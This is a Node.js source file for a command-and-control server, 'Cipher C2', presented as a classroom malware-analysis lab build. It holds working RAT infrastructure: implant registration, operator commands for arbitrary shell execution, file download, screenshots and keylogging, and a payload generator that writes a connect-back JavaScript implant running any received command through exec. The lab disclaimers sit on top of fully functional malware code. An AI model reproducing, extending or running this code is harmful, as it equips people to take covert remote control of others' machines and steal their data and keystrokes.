/**
 * C2 Server — Educational Malware Analysis Demo (FIXED BUILD)
 * ============================================================
 * FOR ISOLATED CLASSROOM LAB USE ONLY. Do not deploy on networks
 * that are not yours. Detection & teardown exercises come later.
 *
 * FIXES vs. the half-built original:
 *  [2] Single canonical event contract (see PROTOCOL.md). Clients now
 *      join a Socket.IO room named by their client_id, so targeted
 *      io.to(clientId).emit(...) commands actually route.
 *  [3] Python and JS clients use the SAME event names/payload shapes
 *      as the server emits/listens for.
 *  [4] Dashboard is a real Socket.IO "operator" client: it sends
 *      commands over the socket (dashboard_command) instead of only
 *      polling REST, and it listens for results (client_response,
 *      keylogData, screenshot_data, file_list, shell_output...).
 *  [5] API key is configurable via env/API_KEY or persisted to
 *      .api_key at first boot; served at GET /api/config (key masked)
 *      and shown in full on the console. No hardcoded key in the UI.
 *  [7] Payload generator now emits a Socket.IO-based client that
 *      actually speaks this server's protocol (was raw TCP before).
 *  [8] getSystemInfo() awaited properly; dead multer/infectPDF code
 *      removed; uploads/ + payloads/ dirs created at startup.
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8443;
const HOST = process.env.HOST || '127.0.0.1'; // lab default: localhost only

// ---------------------------------------------------------------------------
// [5] API key: from env, else load persisted, else generate + persist.
// ---------------------------------------------------------------------------
const KEY_FILE = path.join(__dirname, '.api_key');
let API_KEY = process.env.API_KEY || null;
if (!API_KEY) {
  if (fs.existsSync(KEY_FILE)) {
    API_KEY = fs.readFileSync(KEY_FILE, 'utf8').trim();
  } else {
    API_KEY = crypto.randomBytes(32).toString('hex');
    fs.writeFileSync(KEY_FILE, API_KEY, { mode: 0o600 });
  }
}

// ---------------------------------------------------------------------------
// [8] Ensure working directories exist.
// ---------------------------------------------------------------------------
for (const d of ['uploads', 'payloads', 'loot']) {
  fs.mkdirSync(path.join(__dirname, d), { recursive: true });
}

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(cors());
app.use(express.json({ limit: '2mb' }));
app.use(express.static(__dirname));

// In-memory registries (lab-scale demo; no DB needed)
const clients = new Map();   // client_id -> {id, hostname, platform, os, arch, ip, connectedAt, lastSeen, online, socketId}
const keyloggers = new Map(); // client_id -> bool
const dashboardSockets = new Set(); // operator sockets

// ---------------------------------------------------------------------------
// Auth middleware for REST endpoints.
// ---------------------------------------------------------------------------
function requireKey(req, res, next) {
  const supplied = req.headers['x-api-key'];
  if (supplied === API_KEY) return next();
  return res.status(401).json({ error: 'invalid or missing X-API-Key header' });
}

// ---------------------------------------------------------------------------
// Public config endpoint (key masked) so the dashboard can learn the
// expected key FINGERPRINT and show a warning if the operator typed
// the wrong one. Full key printed on server console at boot.
// ---------------------------------------------------------------------------
app.get('/api/config', (req, res) => {
  res.json({
    server: 'cipher-c2',
    version: '2.0.0-lab',
    keyFingerprint: API_KEY.slice(0, 6) + '…' + API_KEY.slice(-4),
    events: {
      serverToClient: ['execute', 'screenshot', 'list_files', 'download_file', 'start_keylogger', 'stop_keylogger', 'ping'],
      clientToServer: ['register_ack', 'client_heartbeat', 'client_response', 'keylogData', 'screenshot_data', 'file_list'],
      dashboardToServer: ['dashboard_command'],
    },
  });
});

app.get('/api/health', (req, res) => {
  const now = Date.now();
  let online = 0;
  for (const c of clients.values()) {
    if (now - c.lastSeen < 30000) c.online = true; else c.online = false;
    if (c.online) online++;
  }
  res.json({ status: 'online', totalClients: clients.size, onlineClients: online, uptimeSec: Math.round(process.uptime()) });
});

// [5] List clients (auth required)
app.get('/api/clients', requireKey, (req, res) => {
  res.json(Array.from(clients.values()));
});

// ---------------------------------------------------------------------------
// [7] Payload generator — now emits a Socket.IO client matching THIS server.
// ---------------------------------------------------------------------------
app.post('/api/generate-payload', requireKey, (req, res) => {
  const host = req.body.host || HOST;
  const port = req.body.port || PORT;
  const clientId = 'rat-' + crypto.randomBytes(4).toString('hex');

  const payload = `// Auto-generated lab implant — connects to ws://${host}:${port}
// Protocol v2 — see PROTOCOL.md. Lab use only.
const { io } = require('socket.io-client');
const os = require('os');
const { exec } = require('child_process');

const CLIENT_ID = '${clientId}';
const socket = io('http://${host}:${port}', { reconnection: true, reconnectionDelay: 3000 });

socket.on('connect', () => {
  socket.emit('register', { client_id: CLIENT_ID, hostname: os.hostname(), platform: os.platform(), os: os.type() + ' ' + os.release(), arch: os.arch() });
});

socket.on('execute', ({ command_id, command }) => {
  exec(command, { timeout: 15000 }, (err, stdout, stderr) => {
    socket.emit('client_response', { client_id: CLIENT_ID, command_id, output: (stdout || '') + (stderr || '') || (err ? String(err) : '') });
  });
});

socket.on('screenshot', () => socket.emit('client_response', { client_id: CLIENT_ID, command_id: 'screenshot', output: 'JS implant: screenshots unsupported, use python_client.py' }));
socket.on('list_files', ({ command_id, dir }) => { try { socket.emit('file_list', { client_id: CLIENT_ID, command_id, files: require('fs').readdirSync(dir || '.') }); } catch (e) { socket.emit('client_response', { client_id: CLIENT_ID, command_id, output: 'ERR ' + e.message }); } });
socket.on('ping', () => socket.emit('client_heartbeat', { client_id: CLIENT_ID }));
`;

  const filename = `${clientId}.js`;
  fs.writeFileSync(path.join(__dirname, 'payloads', filename), payload);
  res.json({ ok: true, file: `payloads/${filename}`, clientId, note: 'Run with: node payloads/' + filename + '  (needs socket.io-client)' });
});

// ---------------------------------------------------------------------------
// REST command bridge (optional path; dashboard uses the socket instead).
// Emits over the client's ROOM so delivery works. [2]
// ---------------------------------------------------------------------------
function sendCommand(clientId, event, payloadObj, cb) {
  if (!clients.has(clientId)) return cb && cb({ error: 'unknown client_id' });
  const command_id = crypto.randomUUID();
  io.to(clientId).timeout(20000).emit(event, { command_id, ...payloadObj }, (err, reply) => {
    cb && cb(err ? { error: 'timeout waiting for client ack' } : reply);
  });
  return command_id;
}

app.post('/api/command', requireKey, (req, res) => {
  const { client_id, action, params } = req.body || {};
  const allowed = ['execute', 'screenshot', 'list_files', 'download_file', 'start_keylogger', 'stop_keylogger', 'ping'];
  if (!client_id || !allowed.includes(action)) {
    return res.status(400).json({ error: `need client_id and action in ${allowed.join('|')}` });
  }
  const cid = sendCommand(client_id, action, params || {}, (reply) => {
    io.emit('client_response', { client_id, command_id: cid, output: JSON.stringify(reply) });
  });
  res.json({ ok: true, command_id: cid, sent: action, to: client_id });
});

// ---------------------------------------------------------------------------
// Socket.IO layer — single canonical contract. [2][3][4]
// ---------------------------------------------------------------------------

// Operators (dashboard) authenticate on connect with the API key.
io.use((socket, next) => {
  socket.data.role = socket.handshake.auth?.apiKey === API_KEY ? 'operator' : 'implant';
  next();
});

io.on('connection', (socket) => {
  // ---- Implant side ----------------------------------------------------
  socket.on('register', (info) => {
    if (!info || !info.client_id) return;
    const rec = {
      ...info,
      ip: socket.handshake.address,
      socketId: socket.id,
      connectedAt: Date.now(),
      lastSeen: Date.now(),
      online: true,
    };
    // Rebind an existing id to this socket (client restart) and make sure
    // the socket joins the room named by client_id so io.to(id) routes. [2]
    const prev = clients.get(info.client_id);
    if (prev && prev.socketId && prev.socketId !== socket.id) {
      io.sockets.sockets.get(prev.socketId)?.leave(info.client_id);
    }
    socket.join(info.client_id);
    clients.set(info.client_id, rec);
    socket.data.clientId = info.client_id;
    socket.emit('register_ack', { ok: true, client_id: info.client_id });
    io.emit('client_joined', rec);                       // → dashboards
    console.log(`[+] implant registered: ${info.client_id} (${info.hostname}, ${info.platform})`);
  });

  socket.on('client_heartbeat', (msg = {}) => {
    const id = msg.client_id || socket.data.clientId;
    if (id && clients.has(id)) clients.get(id).lastSeen = Date.now();
  });

  // Results relayed verbatim to all operators. [4]
  for (const ev of ['client_response', 'keylogData', 'screenshot_data', 'file_list']) {
    socket.on(ev, (data = {}) => {
      const id = data.client_id || socket.data.clientId;
      if (id && clients.has(id)) clients.get(id).lastSeen = Date.now();
      io.emit(ev, { ...data, client_id: id, ts: Date.now() });
    });
  }

  socket.on('disconnect', () => {
    if (socket.data.role === 'operator') {
      dashboardSockets.delete(socket.id);
      return;
    }
    const id = socket.data.clientId;
    if (id && clients.has(id)) {
      clients.get(id).online = false;
      clients.get(id).socketId = null;
      io.emit('client_disconnected', { client_id: id });
      console.log(`[-] implant lost: ${id}`);
    }
  });

  // ---- Operator (dashboard) side ---------------------------------------
  socket.on('operator_hello', (auth = {}) => {
    if (auth.apiKey !== API_KEY) return socket.emit('operator_denied', { error: 'bad api key' });
    socket.data.role = 'operator';
    dashboardSockets.add(socket.id);
    socket.emit('operator_welcome', { clients: Array.from(clients.values()), keyloggers: Object.fromEntries(keyloggers) });
  });

  socket.on('dashboard_command', ({ client_id, action, params } = {}) => {
    if (socket.data.role !== 'operator') return;
    const allowed = ['execute', 'screenshot', 'list_files', 'download_file', 'start_keylogger', 'stop_keylogger', 'ping'];
    if (!client_id || !allowed.includes(action)) {
      return socket.emit('command_rejected', { error: `action must be one of ${allowed.join('|')}` });
    }
    if (action === 'start_keylogger') keyloggers.set(client_id, true);
    if (action === 'stop_keylogger') keyloggers.set(client_id, false);
    const command_id = sendCommand(client_id, action, params || {});
    socket.emit('command_sent', { client_id, action, command_id });
    io.emit('operator_event', { type: 'command', client_id, action, command_id, ts: Date.now() });
  });

  socket.on('dashboard_toggle', ({ enabled } = {}) => {
    if (socket.data.role !== 'operator') return;
    // Lab convenience: enable/disable sending to ALL implants.
    for (const [id, c] of clients) {
      if (c.online) io.to(id).emit(enabled ? 'ping' : 'stop_keylogger', { command_id: crypto.randomUUID() });
    }
    io.emit('operator_event', { type: 'toggle', enabled, ts: Date.now() });
  });
});

server.listen(PORT, HOST, () => {
  console.log('==============================================================');
  console.log(` Cipher C2 (lab build) listening on http://${HOST}:${PORT}`);
  console.log(` Dashboard:  http://${HOST}:${PORT}/index.html`);
  console.log(` API KEY (copy into dashboard login): ${API_KEY}`);
  console.log(` (also persisted in .api_key — keep out of git)`);
  console.log('==============================================================');
});
